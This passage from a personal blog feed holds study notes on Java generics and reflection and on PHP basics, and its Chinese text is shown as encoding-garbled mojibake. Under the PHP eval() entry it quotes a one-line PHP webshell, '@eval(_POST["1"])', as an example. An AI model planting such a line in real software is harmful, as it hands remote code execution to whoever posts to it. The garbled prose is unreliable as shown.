ä¸ºæ³›å‹ï¼Œéšæ„è¡¨ç¤º</p></li><li><p>å¸¦ä¸€ä¸ªæˆ–å¤šä¸ªç±»å‹å‚æ•°çš„ç±»æˆ–æ¥å£</p></li></ul><h2 id="å£°æ˜"><a href="#å£°æ˜" class="headerlink" title="å£°æ˜"></a>å£°æ˜</h2><ul><li>interface List&lt;T&gt;{ }</li><li>class HashMap&lt;K,V&gt;{ }</li><li>Tã€Kã€V ä»£è¡¨è¡¨ç¤ºç±»å‹</li></ul><h2 id="æ³›å‹å®ä¾‹åŒ–"><a href="#æ³›å‹å®ä¾‹åŒ–" class="headerlink" title="æ³›å‹å®ä¾‹åŒ–"></a>æ³›å‹å®ä¾‹åŒ–</h2><ul><li>HashMap&lt;Stringï¼ŒString&gt;   hashMap &#x3D; new HashMap&lt;&gt;( )ï¼›</li><li>Iterator&lt;Map.Entry&lt;String,String&gt;&gt;  iterator &#x3D; entries.iterator( )ï¼›</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();ç­‰ä»·äº HashMap&lt;Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><h3 id="è‡ªå®šä¹‰æ³›å‹ç±»"><a href="#è‡ªå®šä¹‰æ³›å‹ç±»" class="headerlink" title="è‡ªå®šä¹‰æ³›å‹ç±»"></a>è‡ªå®šä¹‰æ³›å‹ç±»</h3><ul><li>ä¸æŒ‡å®šç±»å‹é»˜è®¤ä¸º Object</li></ul><h3 id="è‡ªå®šä¹‰æ³›å‹æ¥å£"><a href="#è‡ªå®šä¹‰æ³›å‹æ¥å£" class="headerlink" title="è‡ªå®šä¹‰æ³›å‹æ¥å£"></a>è‡ªå®šä¹‰æ³›å‹æ¥å£</h3><ul><li>æ¥å£ä¸­é™æ€æˆå‘˜ä¸èƒ½ä½¿ç”¨æ³›å‹</li><li>ç±»å‹åœ¨ç»§æ‰¿æ¥å£æˆ–ç±»å®ç°æ¥å£æ—¶ç¡®å®š</li></ul><h3 id="è‡ªå®šä¹‰æ³›å‹æ–¹æ³•"><a href="#è‡ªå®šä¹‰æ³›å‹æ–¹æ³•" class="headerlink" title="è‡ªå®šä¹‰æ³›å‹æ–¹æ³•"></a>è‡ªå®šä¹‰æ³›å‹æ–¹æ³•</h3><ul><li><p>å¸¦ç±»å‹å‚æ•°çš„æ–¹æ³•</p></li><li><p>æ³›å‹æ–¹æ³•å¯ä»¥å®šä¹‰åœ¨æ³›å‹å’Œæ™®é€šç±»é‡Œé¢ã€‚ä½¿ç”¨æ³›å‹çš„æ–¹æ³•æœªå®šä¹‰æ³›å‹</p></li><li><p>å¯ä»¥ä½¿ç”¨è‡ªå·±å£°æ˜çš„æ³›å‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç±»å£°æ˜çš„æ³›å‹</p></li><li><p>åœ¨è°ƒç”¨æ—¶ä¼šç¡®å®šç±»å‹</p></li></ul><h3 id="æ³›å‹é€šé…ç¬¦-â€œ-ï¼Ÿâ€"><a href="#æ³›å‹é€šé…ç¬¦-â€œ-ï¼Ÿâ€" class="headerlink" title="æ³›å‹é€šé…ç¬¦ â€œ ï¼Ÿâ€"></a>æ³›å‹é€šé…ç¬¦ â€œ ï¼Ÿâ€</h3><ul><li><p>æ³›å‹æ²¡æœ‰ç»§æ‰¿</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Object&gt; list=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br></code></pre></td></tr></table></figure></li><li><p><code>&lt;?&gt;</code> : æ”¯æŒä»»æ„æ³›å‹ç±»å‹ï¼Œä»»ä½•ç±»å‹çš„ List å¯¹è±¡</p></li><li><p><code>&lt;? extends A&gt;</code> : æ¥å— A æˆ– A çš„å­ç±»ï¼Œè§„å®šä¸Šé™</p></li><li><p><code>&lt;? super A&gt; </code>: A ç±»æˆ– A çš„çˆ¶ç±»ï¼Œè§„å®šä¸‹é™</p></li></ul><h1 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h1><ul><li>åœ¨ä¸ä¿®æ”¹æºç æ—¶ï¼Œæ§åˆ¶ç¨‹åºï¼Œä¸çŸ¥é“ç±»ç»“æ„æƒ…å†µä¸‹è·å–ç±»çš„ç»“æ„ä¿¡æ¯</li><li>å¯ä»¥çªç ´è®¿é—®ä¿®é¥°ç¬¦çš„é™åˆ¶</li></ul><h2 id="Class-ç±»çš„æ–¹æ³•"><a href="#Class-ç±»çš„æ–¹æ³•" class="headerlink" title="Class ç±»çš„æ–¹æ³•"></a>Class ç±»çš„æ–¹æ³•</h2><table><thead><tr><th>æ–¹æ³•å</th><th>ä½œç”¨æè¿°</th></tr></thead><tbody><tr><td>getName</td><td>è·å–å…¨ç±»å</td></tr><tr><td>getSimpleName</td><td>è·å–ç®€å•ç±»å</td></tr><tr><td>getSuperClass</td><td>ä»¥ Class å½¢å¼è¿”å›çˆ¶ç±»ä¿¡æ¯</td></tr><tr><td>getInterface</td><td>ä»¥ Class [ ] å½¢å¼è¿”å›æ¥å£ä¿¡æ¯</td></tr><tr><td>getFiled &#x2F; getFields</td><td>è·å– public ä¿®é¥°çš„å­—æ®µï¼ŒåŒ…å«æœ¬ç±»å’Œçˆ¶ç±»</td></tr><tr><td>getDeclaredFiled &#x2F; getDeclaredFileds</td><td>è·å–æœ¬ç±»æ‰€æœ‰å­—æ®µ</td></tr><tr><td>getMethod &#x2F; getMethods</td><td>è·å– public ä¿®é¥°çš„æ–¹æ³•ï¼ŒåŒ…å«æœ¬ç±»å’Œçˆ¶ç±»</td></tr><tr><td>getDeclaredMethod &#x2F; getDeclaredMethods</td><td>è·å–æœ¬ç±»æ‰€æœ‰æ–¹æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰</td></tr><tr><td>getConstructors</td><td>è·å–æœ¬ç±» public ä¿®é¥°çš„æ„é€ å™¨</td></tr><tr><td>getDeclearedConstructors</td><td>è·å–æœ¬ç±»æ‰€æœ‰æ„é€ å™¨</td></tr><tr><td>getPackage</td><td>ä»¥ Package å½¢å¼è¿”å›åŒ…ä¿¡æ¯</td></tr><tr><td>getAnnotations</td><td>ä»¥ Annotation å½¢å¼è¿”å›æ³¨è§£ä¿¡æ¯</td></tr><tr><td>getClass</td><td>å¾—åˆ°è¿è¡Œç±»å‹</td></tr><tr><td>newInstance</td><td>åˆ›å»ºå¯¹è±¡</td></tr><tr><td>getClassLoader</td><td>å¾—åˆ°ç±»åŠ è½½å™¨</td></tr><tr><td>forName</td><td>å¾—åˆ°ç±»å¯¹è±¡</td></tr></tbody></table><h2 id="Class-ç±»å¯¹è±¡è·å–æ–¹å¼"><a href="#Class-ç±»å¯¹è±¡è·å–æ–¹å¼" class="headerlink" title="Class ç±»å¯¹è±¡è·å–æ–¹å¼"></a>Class ç±»å¯¹è±¡è·å–æ–¹å¼</h2><ul><li>Class.forName ( â€¦ )</li><li>ç±».classç”¨äºå‚æ•°ä¼ é€’</li><li>å¯¹è±¡.getClass ( )</li><li>ClassLoader.loadClass ( â€¦ )</li><li>åŸºæœ¬æ•°æ®ç±»å‹çš„ Class ç±»å¯¹è±¡è·å–   int.class    Integer.TYPE</li><li>åŸºæœ¬æ•°æ®ç±»å‹çš„ Class ç±»å¯¹è±¡è·å–    Integer.class</li></ul><h2 id="Class-ç±»å¯¹è±¡"><a href="#Class-ç±»å¯¹è±¡" class="headerlink" title="Class ç±»å¯¹è±¡"></a>Class ç±»å¯¹è±¡</h2><ul><li>å¤–éƒ¨ç±»</li><li>æˆå‘˜å†…éƒ¨ç±»ï¼Œé™æ€å†…éƒ¨ç±»ï¼Œå±€éƒ¨å†…éƒ¨ç±»ï¼ŒåŒ¿åå†…éƒ¨ç±»</li><li>interfaceï¼šæ¥å£</li><li>æ•°ç»„</li><li>enumï¼šæšä¸¾     Thread.State</li><li>annotationï¼šæ³¨è§£</li><li>åŸºæœ¬æ•°æ®ç±»å‹</li><li>void</li></ul><h2 id="Class-ç±»çš„æ–¹æ³•-1"><a href="#Class-ç±»çš„æ–¹æ³•-1" class="headerlink" title="Class ç±»çš„æ–¹æ³•"></a>Class ç±»çš„æ–¹æ³•</h2><p>åå°„åˆ›é€ å¯¹è±¡</p><ul><li>æ— å‚æ„é€ å™¨</li><li>æœ‰å‚æ„é€ å™¨</li><li>ç§æœ‰æ„é€ å™¨</li></ul><p>åå°„æ“ä½œå±æ€§</p><ul><li>è·å–å±æ€§</li><li>è®¾ç½®å±æ€§</li><li>ç§æœ‰å±æ€§</li><li>å¦‚æœæ˜¯é™æ€å±æ€§ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ç»™ null</li></ul><p>åå°„æ“ä½œæ–¹æ³•</p><ul><li>è·å–æ–¹æ³•<ul><li>getMethod</li></ul></li></ul><h2 id="å…¶ä»–æ–¹æ³•"><a href="#å…¶ä»–æ–¹æ³•" class="headerlink" title="å…¶ä»–æ–¹æ³•"></a>å…¶ä»–æ–¹æ³•</h2><p>java . lang . reflect .Filed ç±»</p><ul><li>getModifiers ï¼šä»¥ int å½¢å¼è¿”å›ä¿®é¥°ç¬¦</li><li>getTypeï¼šä»¥ Class å½¢å¼è¿”å›ç±»å‹</li><li>getNameï¼šè¿”å›å±æ€§å</li></ul><p>java . lang . reflect . Method ç±»</p><ul><li>getModifiers ï¼šä»¥ int å½¢å¼è¿”å›ä¿®é¥°ç¬¦</li><li>getReturnTypeï¼šä»¥ Class å½¢å¼è·å–è¿”å›ç±»å‹</li><li>getNameï¼šè¿”å›æ–¹æ³•å</li><li>getParameterTypesï¼šä»¥ Class [ ] è¿”å›å‚æ•°ç±»å‹æ•°ç»„</li></ul><p>java . lang . reflect . Constructor ç±»</p><ul><li>getModifiers ï¼šä»¥ int å½¢å¼è¿”å›ä¿®é¥°ç¬¦</li><li>getNameï¼šè¿”å›æ„é€ å™¨åï¼ˆå…¨ç±»åï¼‰</li><li>getParameterTypesï¼šä»¥ Class [ ] è¿”å›å‚æ•°ç±»å‹æ•°ç»„</li><li>newInstance</li></ul><p>å·®ä¸å¤šå°±åˆ°è¿™äº†ï¼Œç¬”è®°æ¯”è¾ƒç®€æ´ï¼Œé‡Œé¢æœ‰å¾ˆå¤šæ¯”è¾ƒç®€å•çš„ä¸œè¥¿æ²¡å†™ï¼Œå¯èƒ½å› ä¸ºç¯‡å¹…å¤ªé•¿äº†ï¼Œä¼ ä¸Šæ¥çš„æ—¶å€™è€æ˜¯å‡ºç°å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ï¼Œå¤§åŠå¤œçš„å·®ç‚¹ç»™æˆ‘å¹²ç ´é˜² qwqï¼Œæäº†å¥½åŠå¤©æ‰å¼„å¥½å‘œå‘œå‘œå‘œå‘œâ€¦â€¦</p><p><img src="/qwq.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>è¯­è¨€</category>
      
      <category>Java</category>
      
      <category>Java åŸºç¡€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP åŸºç¡€(éƒ¨åˆ†)</title>
    <link href="/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/"/>
    <url>/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p>å…³äº PHP çš„ä¸€å°éƒ¨åˆ†çŸ¥è¯†</p><span id="more"></span><h1 id="é­”æœ¯å¸¸é‡"><a href="#é­”æœ¯å¸¸é‡" class="headerlink" title="é­”æœ¯å¸¸é‡"></a>é­”æœ¯å¸¸é‡</h1><p>å¦‚ <code>__FILE__</code> è¿™æ ·çš„é¢„å®šä¹‰å¸¸é‡ï¼Œè¢«ç§°ä¸ºé­”æœ¯å¸¸é‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// è¿”å›æ–‡ä»¶å®Œæ•´çš„è·¯å¾„å’Œæ–‡ä»¶å</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//ä»£ç é«˜äº®æ˜¾ç¤ºå½“å‰æ–‡ä»¶å†…å®¹</span><br><span class="hljs-keyword">__LINE__</span><span class="hljs-comment">// è¡¨ç¤ºå½“å‰è¡Œå·</span><br><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// è¡¨ç¤ºå½“å‰æ–‡ä»¶å</span><br><span class="hljs-keyword">__DIR__</span><span class="hljs-comment">// è¡¨ç¤ºå½“å‰æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•</span><br><span class="hljs-keyword">__FUNCTION__</span><span class="hljs-comment">// è¡¨ç¤ºå½“å‰å‡½æ•°å</span><br><span class="hljs-keyword">__CLASS__</span><span class="hljs-comment">// è¡¨ç¤ºå½“å‰ç±»å</span><br><span class="hljs-keyword">__METHOD__</span><span class="hljs-comment">// è¡¨ç¤ºå½“å‰æ–¹æ³•å</span><br><span class="hljs-keyword">__NAMESPACE__</span><span class="hljs-comment">// è¡¨ç¤ºå½“å‰å‘½åç©ºé—´</span><br></code></pre></td></tr></table></figure><h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h1><h2 id="æ–‡ä»¶æ“ä½œå‡½æ•°"><a href="#æ–‡ä»¶æ“ä½œå‡½æ•°" class="headerlink" title="æ–‡ä»¶æ“ä½œå‡½æ•°"></a>æ–‡ä»¶æ“ä½œå‡½æ•°</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">include</span>(): åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ï¼ŒåŒ…å«æ–‡ä»¶å‘ç”Ÿé”™è¯¯ï¼Œç¨‹åºè­¦å‘Šï¼Œä½†ä¼šç»§ç»­æ‰§è¡Œ<br><span class="hljs-built_in">include_once</span>(): æ£€æŸ¥è¿™ä¸ªæ–‡ä»¶æ˜¯å¦å·²ç»è¢«å¯¼å…¥ï¼Œå¦‚æœå·²å¯¼å…¥ï¼Œä¸‹æ–‡ä¾¿ä¸ä¼šå†å¯¼å…¥ï¼Œç›´é¢ once ç†è§£å°±æ˜¯åªå¯¼å…¥ä¸€æ¬¡<br><span class="hljs-built_in">require</span>(): åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šçš„æ–‡ä»¶ï¼ŒåŒ…å«æ–‡ä»¶å‘ç”Ÿé”™è¯¯æ—¶ï¼Œç¨‹åºç›´æ¥ç»ˆæ­¢æ‰§è¡Œ<br><span class="hljs-built_in">require_once</span>():å’Œ require ç±»ä¼¼ï¼Œä¸åŒå¤„åœ¨äº require_once åªå¯¼å…¥ä¸€æ¬¡<br><span class="hljs-built_in">fopen</span>(): æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æˆ– URL<br><span class="hljs-built_in">file_get_contents</span>(): è¯»å–æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ <span class="hljs-variable">$content</span> = <span class="hljs-built_in">file_get_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-built_in">file_put_contents</span>(): å°†ä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼š<span class="hljs-built_in">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="ä»£ç æ‰§è¡Œå‡½æ•°"></a>ä»£ç æ‰§è¡Œå‡½æ•°</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>(): å°†å­—ç¬¦ä¸²å½“ä¸­phpä»£ç æ¥æ‰§è¡Œï¼Œæ¯”å¦‚: ä¸€å¥è¯æœ¨é©¬@<span class="hljs-built_in">eval</span>(_POST[<span class="hljs-string">&quot;1&quot;</span>]);<br><span class="hljs-built_in">assert</span>(): æ£€æµ‹æ‰§è¡Œæ¡ä»¶æ˜¯å¦ä¸º true<br></code></pre></td></tr></table></figure><p>è°ƒç”¨ç³»ç»Ÿåº•å±‚çš„4ä¸ªæ–¹æ³•-system , shell_exec , exec , passthru</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">system</span>(): è°ƒç”¨ç³»ç»Ÿåº•å±‚ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¾‹å¦‚ <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>); åˆ—å‡ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶<br><span class="hljs-built_in">shell_exc</span>(): é€šè¿‡ shell ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›<br><span class="hljs-built_in">exec</span>():æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº<br><span class="hljs-built_in">passthru</span>():æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶ä¸”æ˜¾ç¤ºåŸå§‹è¾“å‡ºï¼Œå½“æ‰€æ‰§è¡Œçš„ Unix<br>å‘½ä»¤è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®ï¼Œ å¹¶ä¸”éœ€è¦ç›´æ¥ä¼ é€åˆ°æµè§ˆå™¨çš„æ—¶å€™ï¼Œ éœ€è¦ç”¨æ­¤å‡½æ•°æ¥æ›¿ä»£ <span class="hljs-built_in">exec</span>() æˆ– <span class="hljs-built_in">system</span>() å‡½æ•°<br></code></pre></td></tr></table></figure><h2 id="ååºåˆ—åŒ–å‡½æ•°"><a href="#ååºåˆ—åŒ–å‡½æ•°" class="headerlink" title="ååºåˆ—åŒ–å‡½æ•°"></a>ååºåˆ—åŒ–å‡½æ•°</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">unserialize</span>(): å°†ä¸€ä¸ªå·²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è½¬æ¢å› PHP çš„å€¼ã€‚ä¾‹å¦‚ï¼š<span class="hljs-variable">$array</span> = <span class="hljs-built_in">unserialize</span>(<span class="hljs-variable">$serializedStr</span>); å¯ä»¥å°†ä¸€ä¸ªåºåˆ—åŒ–çš„æ•°ç»„å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°ç»„ã€‚<br></code></pre></td></tr></table></figure><h2 id="æ•°æ®åº“æ“ä½œå‡½æ•°"><a href="#æ•°æ®åº“æ“ä½œå‡½æ•°" class="headerlink" title="æ•°æ®åº“æ“ä½œå‡½æ•°"></a>æ•°æ®åº“æ“ä½œå‡½æ•°</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mysql_query</span>(), <span class="hljs-built_in">mysqli_query</span>(): å‘é€ä¸€ä¸ª MySQL æŸ¥è¯¢ã€‚ä¾‹å¦‚ï¼š<span class="hljs-variable">$result</span> = <span class="hljs-built_in">mysql_query</span>(<span class="hljs-string">&quot;SELECT * FROM users&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°"><a href="#æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°"></a>æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°</h2><p><strong>preg_match():</strong></p><p>ç”¨äºè¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼ŒæˆåŠŸè¿”å› 1ï¼Œå¦åˆ™è¿”å› 0ã€‚</p><p>æ³¨: <code>preg_match() </code>ç¬¬ä¸€æ¬¡åŒ¹é…æˆåŠŸåå°±ä¼šåœæ­¢åŒ¹é…ï¼Œå¦‚æœè¦å®ç°å…¨éƒ¨ç»“æœçš„åŒ¹é…ï¼Œå³æœç´¢åˆ°æ£€ç´¢å¯¹è±¡çš„ç»“å°¾å¤„ï¼Œåˆ™éœ€ä½¿ç”¨ <code>preg_match_all()</code> å‡½æ•°ã€‚ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>, <span class="hljs-variable">$matches</span>))<br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was found:&quot;</span>. <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]; <br>   &#125; <br>   <span class="hljs-keyword">else</span><br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was not found.&quot;</span>; <br>   &#125; <br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//A match was found: PHP </span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all():</strong> </p><p>ç”¨äºè¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼å…¨å±€åŒ¹é…ï¼ŒæˆåŠŸè¿”å›æ•´ä¸ªæ¨¡å¼åŒ¹é…çš„æ¬¡æ•°ï¼ˆå¯èƒ½ä¸ºé›¶ï¼‰ï¼Œå¦‚æœå‡ºé”™è¿”å› FALSE ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;&lt;pre&gt;å­¦ä¹ phpæ˜¯ä¸€ä»¶å¿«ä¹çš„äº‹ã€‚&lt;/pre&gt;&lt;pre&gt;æ‰€æœ‰çš„ phper éœ€è¦å…±åŒåŠªåŠ›ï¼&lt;/pre&gt;&quot;</span>; <br>   <span class="hljs-variable">$kw</span> = <span class="hljs-string">&quot;php&quot;</span>; <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/&lt;pre&gt;([sS]*?)&lt;/pre&gt;/&#x27;</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$mat</span>); <br>   <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>]);<span class="hljs-variable">$i</span>++)<br>   &#123;<br>      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>]; <br>      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$kw</span>, <span class="hljs-string">&#x27;&lt;span style=&quot;color:#ff0000&quot;&gt;&#x27;</span>.<span class="hljs-variable">$kw</span>.<span class="hljs-string">&#x27;&lt;/span&gt;&#x27;</span>, <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>]); <br>      <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$str</span>); <br>   &#125; <br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//å°†æ‰€æœ‰ &lt;pre&gt;&lt;/pre&gt; æ ‡ç­¾å†…çš„å…³é”®å­—æ˜¾ç¤ºä¸ºçº¢è‰²</span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all()</strong></p><p>ç”¨äºè¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼å…¨å±€åŒ¹é…ï¼ŒæˆåŠŸè¿”å›æ•´ä¸ªæ¨¡å¼åŒ¹é…çš„æ¬¡æ•°ï¼ˆå¯èƒ½ä¸ºé›¶ï¼‰ï¼Œå¦‚æœå‡ºé”™è¿”å› FALSE ã€‚</p><p><strong>preg_replace()</strong></p><p> æ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼æœç´¢å’Œæ›¿æ¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;butt3rf1y&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/\d+/&#x27;</span>;<span class="hljs-comment">// \d+æ˜¯åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—</span><br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;R&#x27;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// buttRrfRy</span><br></code></pre></td></tr></table></figure><p><strong>preg_split()</strong></p><p>å°†å­—ç¬¦ä¸²ä¾æŒ‡å®šçš„è§„åˆ™åˆ‡å¼€ã€‚</p><h1 id="è¡¨å•æ•°æ®"><a href="#è¡¨å•æ•°æ®" class="headerlink" title="è¡¨å•æ•°æ®"></a>è¡¨å•æ•°æ®</h1><p><strong>$_GET</strong></p><p>æ¥å— GET è¯·æ±‚ä¼ é€’çš„å‚æ•°</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">example.com/index.php?<span class="hljs-attribute">bu</span>=butt3rf1yï¼Œä½ å¯ä»¥ä½¿ç”¨ <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] æ¥è·å–ç›¸åº”çš„å€¼<br></code></pre></td></tr></table></figure><p><strong>$_POST</strong></p><p>æ¥å— POST ä¼ å‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">example.com/index.php è¿›è¡Œ POST ä¼ å‚ï¼Œå‚æ•°åä¸º bu å†…å®¹ä¸º but3rf1yï¼Œå¯ä»¥ä½¿ç”¨ <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] æ¥è·å–ç›¸åº”çš„å€¼ã€‚<br></code></pre></td></tr></table></figure><p><strong>$_REQUEST</strong></p><p>æ¥å— GET å’Œ POST ä»¥åŠ Cookie è¯·æ±‚ä¼ é€’çš„å‚æ•°</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">é€šè¿‡ <span class="hljs-built_in">GET</span> è¯·æ±‚ URL ä¼ é€’äº†ä¸€ä¸ªå‚æ•° example.com/index.php?<span class="hljs-attribute">key</span>=value_from_getï¼Œå¯ä»¥é€šè¿‡ <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] è·å–è¿™ä¸ªå€¼ã€‚<br>é€šè¿‡ POST 